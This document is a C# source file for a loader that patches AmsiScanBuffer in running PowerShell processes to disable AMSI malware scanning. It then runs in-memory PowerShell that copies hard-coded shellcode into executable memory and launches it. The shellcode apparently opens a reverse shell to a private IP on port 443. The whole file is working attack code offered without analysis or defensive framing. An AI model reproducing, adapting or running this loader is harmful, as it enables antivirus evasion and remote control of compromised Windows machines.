using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Runspaces;



namespace FullBypassLoader
{
    public class FullLoader
    {

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint floldProtect);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint dwSize, out int lpNumberOfBytesWritten);


        public static int noScan()
        {
            Process[] processes = Process.GetProcessesByName("powershell");
            if (processes.Length != 0)
            {
                Console.WriteLine("[+] Found " + processes.Length + " powershell processes\n");
            }
            else
            {
                Console.WriteLine("[-] Powershell process does not exist");
                Console.WriteLine("Please create powershell process");
                System.Environment.Exit(1);
            }

            int id = 0;
            bool res = false;
            for (int l = 0; l < processes.Length; l++)
            {

                id++;
                Console.WriteLine("#" + id);
                IntPtr hHandle = OpenProcess(0x001F0FFF, false, processes[l].Id);
                IntPtr baseAddress = IntPtr.Zero;
                IntPtr amsiScanBuffer = IntPtr.Zero;
                int moduleSize = 0;


                Console.WriteLine("[+] Powershell process id: " + processes[l].Id + " & handle: " + hHandle);
                foreach (ProcessModule processModule in processes[l].Modules)
                {
                    if (processModule.ModuleName == "amsi.dll")
                    {
                        Console.WriteLine("[+] Base address of amsi.dll: " + "0x" + processModule.BaseAddress.ToString("X"));
                        baseAddress = processModule.BaseAddress;
                        moduleSize = processModule.ModuleMemorySize;
                        Console.WriteLine("[+] Size of the module: 0x" + moduleSize.ToString("X"));
                    }
                }

                byte[] ret = new byte[32];
                // First 32 bytes of AmsiScanBuffer function
                byte[] fewBytes = new byte[32] { 0x4c, 0x8b, 0xdc, 0x49, 0x89, 0x5b, 0x08, 0x49, 0x89, 0x6b, 0x10, 0x49, 0x89, 0x73, 0x18, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x70, 0x4d, 0x8b, 0xf9, 0x41, 0x8b, 0xf8, 0x48, 0x8b };
                IntPtr outt;
                bool addrScanBuffer = false;
                int count = 0;

                for (int i = 0; i <= moduleSize; i += fewBytes.Length)
                {
                    ReadProcessMemory(hHandle, baseAddress + i, ret, fewBytes.Length, out outt);
                    if (addrScanBuffer == true)
                    {
                        break;
                    }
                    for (int j = 0; j < fewBytes.Length; j++)
                    {
                        if (count == fewBytes.Length - 1)
                        {
                            amsiScanBuffer = baseAddress + i;
                            Console.WriteLine("[+] Found AmsiScanBuffer function: 0x" + amsiScanBuffer.ToString("X"));
                            res = false;
                            addrScanBuffer = true;
                            break;
                        }
                        if (fewBytes[j] == ret[j])
                        {
                            count++;
                        }
                        else if (fewBytes[j] != ret[j])
                        {
                            count = 0;
                            break;
                        }
                    }
                }
                if (count != fewBytes.Length - 1)
                {
                    Console.WriteLine("[-] Cannot find need bytes of AmsiScanBuffer function");
                    Console.WriteLine("Maybe you have already hijacked memory :)\n----------------------------------------------------------\n");
                    res = true;
                }
                if (res)
                {
                    continue;
                }

                uint lpflOldProtect;
                if (VirtualProtectEx(hHandle, baseAddress, (uint)0x1000, 0x40, out lpflOldProtect))
                {
                    Console.WriteLine("[+] Successfully changed memory protection");
                }
                else
                {
                    Console.WriteLine("[-] Changing memory protection failed");
                }

                byte[] hijack = new byte[3] { 0x31, 0xff, 0x90 };
                int numberOfBytesWritten = 0;
                if (WriteProcessMemory(hHandle, amsiScanBuffer + 0x1b, hijack, (uint)hijack.Length, out numberOfBytesWritten))
                {
                    Console.WriteLine("[+] Successfully hijacked\n----------------------------------------------------------\n");
                }
                else
                {
                    Console.WriteLine("[-] Hijacking failed\n----------------------------------------------------------\n");
                }

            }


            return 0;
        }


        public static void Main()
        {

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            Console.WriteLine(noScan());
            string revShellcommand = @"function LookupFunc {

	            Param ($moduleName, $functionName)

	            $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
                Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
                  Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
                $tmp=@()
                $assem.GetMethods() | ForEach-Object {If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
	            return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
            }

            function getDelegateType {

	            Param (
		            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		            [Parameter(Position = 1)] [Type] $delType = [Void]
	            )

	            $type = [AppDomain]::CurrentDomain.
                DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
                [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
                  DefineDynamicModule('InMemoryModule', $false).
                  DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
                  [System.MulticastDelegate])

              $type.
                DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
                  SetImplementationFlags('Runtime, Managed')

              $type.
                DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
                  SetImplementationFlags('Runtime, Managed')

	            return $type.CreateType()
            }

            $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

            [Byte[]] $buf = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0xf,0xb7,0x4a,0x26,0x8b,0x72,0x28,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x1,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x57,0x74,0x4c,0x1,0xd0,0x50,0x8b,0x58,0x20,0x1,0xd3,0x8b,0x48,0x18,0x85,0xc9,0x74,0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xc0,0xc1,0xcf,0xd,0xac,0x1,0xc7,0x38,0xe0,0x75,0xf4,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x6a,0xa,0x68,0xc0,0xa8,0x31,0x78,0x68,0x2,0x0,0x1,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xa,0xff,0x4e,0x8,0x75,0xec,0xe8,0x67,0x0,0x0,0x0,0x6a,0x0,0x6a,0x4,0x56,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x56,0x6a,0x0,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x0,0x56,0x53,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d,0x28,0x58,0x68,0x0,0x40,0x0,0x0,0x6a,0x0,0x50,0x68,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0xc,0x24,0xf,0x85,0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x1,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x0,0x53,0xff,0xd5

            [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

            $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

            [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)";

            ps.AddScript(revShellcommand);
            ps.Invoke();
            rs.Close();
        }
    }
}